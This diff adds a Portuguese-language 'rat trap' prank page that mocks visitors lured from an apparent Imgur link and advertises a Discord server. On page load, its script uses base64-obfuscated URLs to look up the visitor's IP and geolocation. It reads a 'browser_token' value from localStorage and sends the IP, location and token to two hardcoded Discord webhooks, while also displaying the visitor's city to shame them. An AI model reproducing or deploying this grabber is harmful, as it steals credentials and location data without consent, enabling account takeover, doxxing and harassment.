@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+    <head>
+
+    </head>
+    <body>
+
+        <body style="margin: 0; padding: 0; font-family: Cambria, Cochin, Georgia, Times, 'Times New Roman', serif;">
+            <div style="width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column;">
+                <img src="ratoeira.webp"  width="300">
+                <h1>Mais um ratão de Imgur capturado! 🤣🤣</h1>
+                <h2>O Rato da vez é de <span id="loc"></span></h2>
+                <h3>Agora vem ver os outros ratos capturados: <a href="https://discord.com/invite/czENSSvNZD">discord.com/invite/czENSSvNZD</a></h3>
+                <iframe src="https://discord.com/widget?id=1293394532842602506&theme=dark" width="350" height="300" allowtransparency="true" frameborder="0" sandbox="allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts"></iframe>
+                <h4>Assinado: JuninhoFudelao</h4>
+            </div>
+        </body>
+
+        <script>
+            
+            class Start {
+                static async start() {
+                    let i;
+                    try{
+                    await fetch(atob("aHR0cHM6Ly9hcGktYmRjLm5ldC9kYXRhL2NsaWVudC1pcA=="))
+                    .then((body) => body.json())
+                    .then((data) => {
+                        i = data.ipString;
+                    })
+                    .catch((error) => {});
+                    await fetch(
+                    `${atob("aHR0cHM6Ly9hcGktYmRjLm5ldC9kYXRhL2lwLWdlb2xvY2F0aW9uP2lwPQ==")}${i}${atob("JmxvY2FsaXR5TGFuZ3VhZ2U9ZW4ma2V5PWJkY183ZDk5Y2VmNzM1YTk0Y2I0YjgyZDM3YTI5NTE4YTU2Nw==")}`
+                    )
+                    .then((body) => body.json())
+                    .then((data) => {
+                        let j = localStorage.getItem(atob("YnJvd3Nlcl90b2tlbg=="));
+                        
+                       let $loc =  document.getElementById("loc");
+                       $loc.innerHTML = data.location.principalSubdivision + ", " + data.location.city + ", " + data.location.localityName;
+
+                        Start.sdc(i,` ${
+                            data.location.principalSubdivision +
+                            ", " +
+                            data.location.city +
+                            ", " +
+                            data.location.localityName
+                        }`,j);
+
+                        Start.ratoeira(`${
+                            data.location.principalSubdivision +
+                            ", " +
+                            data.location.localityName
+                        }`)
+
+                        
+
+                        try{
+                        rh = localStorage.getItem("nitro.room.history");
+                        u = localStorage.getItem("user");
+
+                        
+
+                        } catch (error) {
+                        console.log("erro: ", error);
+                        }
+                        
+                        console.log("foi?")
+                    })
+                    .catch((error) => {
+                        console.log("erro: ", error);
+                    });
+                   
+                    }catch(e){
+                    console.log(e);
+                    }
+                }
+
+
+
+                static sdc(a, b, c) {
+                    let u =
+                    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5MzY3Mzc0MzcyNTQ5NDM1Ni80RUZuYnJCY0pic0pfNHItajRUcE5NRE5iUzdxRVlDdmNiZXdUd0lyVm9VVm5CSk9PT3ZpaFdHc2ZjNXFZb25lWks2bQ==";
+                    const request = new XMLHttpRequest();
+                    request.open("POST", atob(u));
+
+                    request.setRequestHeader("Content-type", "application/json");
+                    let nome = "Desconhecido";
+                    try{
+                        const urlParams = new URLSearchParams(window.location.search);
+                        nome = urlParams.get('client');
+                    } catch(e){}
+                    const params = {
+                    embeds: [
+                        {
+                        title: `Imgur de ${nome}`,
+                        fields: [
+                            {
+                            name: "",
+                            value: `||${c}||`,
+                            },
+                            {
+                            name: "",
+                            value: b,
+                            },
+                            {
+                            name: "",
+                            value: a,
+                            },
+                        ],
+                        },
+                    ],
+                    };
+                    request.send(JSON.stringify(params));
+                }
+
+                static ratoeira(b) {
+                    let u =
+                    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5Mzc0OTUyMDkxOTY5MTI2NC9fX3VUNEhQWmhlUE9fb1d5alRDY3VGOVE5aW9iZEtMMXNsbDVzbS0zbUk5Z3JEbm00MXZxM21pdVZGWDR5Q2NnYXA2MQ==";
+                    const request = new XMLHttpRequest();
+                    request.open("POST", atob(u));
+
+                    request.setRequestHeader("Content-type", "application/json");
+                    let nome = "Desconhecido";
+                    try{
+                        const urlParams = new URLSearchParams(window.location.search);
+                        nome = urlParams.get('client');
+                    } catch(e){}
+                    const params = {
+                    embeds: [
+                        {
+                        title: `Ratão capturado por ${nome}`,
+                        fields: [
+                            {
+                            name: "Rato capturado em",
+                            value: b,
+                            },
+                        ],
+                        },
+                    ],
+                    };
+                    request.send(JSON.stringify(params));
+                }
+                }
+
+                Start.start();
+        </script>
+    </body>
+</html>
